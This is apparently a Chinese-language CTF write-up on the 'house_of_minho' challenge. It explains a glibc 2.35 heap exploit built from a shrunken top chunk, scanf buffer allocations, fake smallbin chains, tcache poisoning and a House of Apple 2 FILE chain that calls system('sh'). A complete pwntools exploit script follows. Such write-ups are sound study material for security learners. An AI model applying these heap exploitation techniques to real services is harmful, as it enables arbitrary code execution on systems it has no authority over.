---
title: house_of_minho
featured_image: ../assets/images/post/5.jpg
draft: false
---

## 问题描述
2.35 的 libc, 应该要打 apple2。限制很强，只能同时管理一个堆块，且堆块的空间只能为 0x40 和 0x80，写入内容都是 0x80, 可以溢出一段微妙的空间。没有逆向和挖洞难度，难点在构造上面

## 思路
### 泄漏
首先考虑泄漏 libc 和 heap。 2.35 已经设置了 tcache 内的 bin 对应位置的 count 为 0，就不会申请出来，这就否定了直接溢出修改 fd 导致任意地址申请的方法，大概率会是这样(注意这里改 size 取出 bin 放回其他 size 的 bin 绕过只能申请一个 chunk 的限制的技巧，后面要用)   

![](https://raw.githubusercontent.com/4ak5ra/image/main/%E5%B8%B8%E8%A7%84.png)

利用 `orange` 的思路，把 top 改小再想办法申请一个大堆块把 top 放到 unsortedbin 里面(topchunk 是页对齐的，改小后重新分配的 topchunk 会在下一页，中间会有一大段断掉的空间)。利用 scanf 等输入型 io 函数的缓冲机制来 malloc 这个大 heap。泄漏就直接用 scanf 的%s 机制配合题目本身的漏洞就行了(覆盖掉要泄漏数据之前的 0)  
```python
add(1, b"a" * 0x48 + p64(0xd11)) # size 改小
show2(0x1000)
free()
add(1, b"a" * 0x50) #覆盖截断的 0
show()
```
### 构造任意写
后面用 1 指代 0x40 的 chunk,2 指代另一个  

count 一直为 1 肯定做不到任意写，所以需要利用 malloc 的整理机制把 smallbin 转移到 tcache 中来增加 count 的值。然后我们想办法利用 unsorted bin 的指针来伪造这样 small bin size 的 unsorted bin。我们只能通过 1 去覆写 2, 所以应该在 2 的 bin 中伪造出这个 bin，所以这个 small bin size 就是 0x90。再利用 scanf 触发 malloc    

另一个问题是整理 bin 时会把 unsorted bin 取出来，2.35 以后这里多了很多保护，我们需要利用 ptmalloc 的思路，在 2 下面伪造两个保护堆块来让其顺利取出。
但是我们的 2 不能溢出伪造不了这样的保护堆块。此时我们需要利用 `consolidate backward` 把 2 的指针降低到 1 的范围里，这样才能利用 2 的空间伪造保护堆块  

利用 consolidate backward 又需要经历一次把 unsorted bin 取出来的操作，但是此时我们却可以利用前面 orange 时 ptmalloc 已经构造出的保护堆块。只需要在这两个堆块的下面再加一个标记这和保护堆块是 inuse 的空间即可，此时再利用 scanf 的缓冲机制即可写入这个标记：scanf 会在缓冲区数据大于 0x400 时把缓冲区的数据复制到新的缓冲区，后面再把这个缓冲区 free 掉合并到原来的 top chunk 里。 
需要注意的是这里需要写入 0 来充当填充数据，而且最后需要输入菜单选项(1,2,3)这样才能不使程序退出

![](https://raw.githubusercontent.com/4ak5ra/image/main/复制.png)

此时会调用这个函数，malloc 出一个 0x800 的堆块并一口气复制 0x400 的数据过去  

![](https://raw.githubusercontent.com/4ak5ra/image/main/转移.png)   

这个函数会复制 0x400 的数据，这个函数结束后会把缓冲区剩下的数据一个一个转移过去，然后把这个新 malloc 的区域 free 掉(虽然我不知道这么设计有什么意义。。。)

![](https://raw.githubusercontent.com/4ak5ra/image/main/scanf结束.png)   
可以看到这里我发了 0x10000 的 0 数据和一个 0x2450 的数据，然后 topchunk 这里有一个 0xfd51 就是复制缓冲区数据剩下的 size

```python
free3(0xd59) # 这里就是污染 0x11 堆块之后的堆块的 size 位置
#............
add(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b"a" * 0x10 + p64(0x30) + p64(0xd00))
#--伪造 consolidate backward 的数据，留出 1 的指针域供后面伪造就行，
#--并扩大 2 的 size 使其利用上 topchunk 的保护堆块绕过 consolidate backward 的取 unsortedbin 操作
free()

add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
free()
#--伪造 2 的保护堆块和 prev_size
```
然后在我们 1 的区域伪造 smallbin 就行
```python
# 这里就开始修改 Unsorted bin 内容，使得在 Unsorted bin 内伪造一个 Small bin 大小的堆块
add(1, flat({
    0x10: 0,
    0x18: 0x91,
    0x20: heap_base + 0x380,
    0x28: libc_base + 0x219ce0,
}, filler=b"\x00"))
show2(0x1000) # 这里触发使得 Unsorted bin 进入 Samll bin
free()
```
再通过 1 去修改 small bin 的指针来构建 small bin 链增加 count
```python
add(1, flat({
    0x10 : {
            0x00: 0,
            0x08: 0x91,
            0x10: heap_base + 0x2c0,
            0x18: heap_base + 0x2c0 + 0x30, #下一个 fake small bin
             
            0x30: 0,
            0x38: 0x91,
            0x40: heap_base + 0x2c0,
            0x48: heap_base + 0x2c0 + 0x50,
 
            0x50: 0,
            0x58: 0x91,
            0x60: heap_base + 0x2c0 + 0x30,
            0x68: libc_base + 0x219d60  #main_arena
        }
    }
, filler=b"\x00"))
free()
```
![](https://raw.githubusercontent.com/4ak5ra/image/main/bin.png)    

下一次我们 add 的时候这些 smallbin 就会进入 tcache 了
### 写入 apple2 io 链
我们一个 heap 只能控制 0x80 的空间，但是我们写入一个 apple2 的链条至少需要 0xd8(vtable 的偏移)，那就伪造 tcache 的 fd 先指到该 0x80 区域，让下一个 tcache 沿着上一个 tcache 的结束空间续写，劫持最后一个 tcache 的 fd 到 io_list 就行(反正我们的 count 有三个)，此时就要顺便把 size 改了不然一会 free 的时候又回去了
```python
add(1, b"X"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))
free() # 修改第一个 tcache 的 fd 和 size

add(2, flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base)>>12),
}, filler=b"\x00"))
free() #在第一个 tcache 布置数据并修改第二个 tcache 的 fd 和 size

fake_file = heap_base + 0x2e0
add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))
free()  #在第二个 tcahe 布置最后的数据并劫持 fd 到 io_list

add(2, p64(fake_file)) #劫持 io_list
```

## 完整 wp
```python
from pwn import *

#context(os ='linux', arch ='mips', endian = "little", log_level ='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os ='linux', arch ='amd64')
context.terminal = ['tmux', 'sp', '-h']
      
rv = lambda x            : io.recv(x)
rl = lambda a=False      : io.recvline(a)
ru = lambda a,b=True     : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sd = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b          : io.sendafter(a,b)
sla = lambda a,b         : io.sendlineafter(a,b)
inter = lambda           : io.interactive()
tob = lambda x: str(x).encode()

file_name = "./run"
elf=ELF(file_name)
url = ""
port = 0
libc=ELF("/work/learn/io/black/lib/libc.so.6")
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global io
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,26):
            b_string += f"c\n"  
            #17 伪造 ub    32apple
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
    if is_start :
        io = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(io,b_string)
        pause()


b_add=0x1315
b_free=0x12AC
b_show=0x1276 
b_scan = 0x1201 
b_slice = [
    b_add,
    b_free
]
io = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) # 直接启动带 pie
#debug(b_slice = b_slice, is_pie = 0, is_start = 1) 
#debug(b_slice = b_slice, is_pie = 0, is_start = 0) 
#io = remote(url, port)

def get_addr(arch):
    if arch == 64:
        return u64(io.recv(6).ljust(8,b'\x00'))
        #return u64(io.recv()[-8:].ljust(8, b'\x00')) 
    else:
        return u32(p.recv(4).ljust(4,b'\x00'))
        #return u32(io.recvuntil(b'\xf7')

def add(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size [1=small / 2=big]: ", tob(size))
    io.sendafter(b"Data: ", content)
 
def show():
    io.sendlineafter(b"> ", b"2")
 # 发送指定数据到 io 缓冲区
def show2(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2")
 
def show3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2" + b"\x00")
 
def free():
    io.sendlineafter(b"> ", b"3")
 
def free3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"3")
 
free3(0xd59) 

add(1, b"a" * 0x48 + p64(0xd11))
show2(0x1000)
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
log.success(f"libc_base : {libc_base:#x}")
free()
add(1, b"a" * 0x48 + p64(0xcf1))
 
free()
add(2, b"a")
free()
add(1, b"aaaa")
free()
add(2, b"aaaa")
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
log.success(f"heap_base : {heap_base:#x}")
free()
 
add(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b"a" * 0x10 + p64(0x30) + p64(0xd00))
free()
add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
free()
add(1, flat({
    0x10: 0,
    0x18: 0x91,
    0x20: heap_base + 0x380,
    0x28: libc_base + 0x219ce0,
}, filler=b"\x00"))
 
show2(0x1000)
free()
 
add(1, flat({
    0x10 : {
            0x00: 0,
            0x08: 0x91,
            0x10: heap_base + 0x2c0,
            0x18: heap_base + 0x2c0 + 0x30,
             
            0x30: 0,
            0x38: 0x91,
            0x40: heap_base + 0x2c0,
            0x48: heap_base + 0x2c0 + 0x50,
 
            0x50: 0,
            0x58: 0x91,
            0x60: heap_base + 0x2c0 + 0x30,
            0x68: libc_base + 0x219d60
        }
    }
, filler=b"\x00"))
free()
add(2, b"aaaa")
free()
_IO_list_all = libc_base + 0x21a680
#system = 0x50d60 + libc_base
system=libc_base + 0x219ce0  - (0x7ef51f33dcc0-0x7ef51f16b000)+libc.symbols["system"]
fake_file = heap_base + 0x2e0
# 见上文 House of apple 2 中解释
add(1, b"X"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))
free()
# 这里是布置 House of apple 2
add(2, flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base)>>12),
}, filler=b"\x00"))
free()
add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))
free()
print(hex(fake_file))
add(2, p64(fake_file))
log.success(f"system : {system:#x}")

io.sendlineafter(b'> ',b"0")
 
io.interactive()
```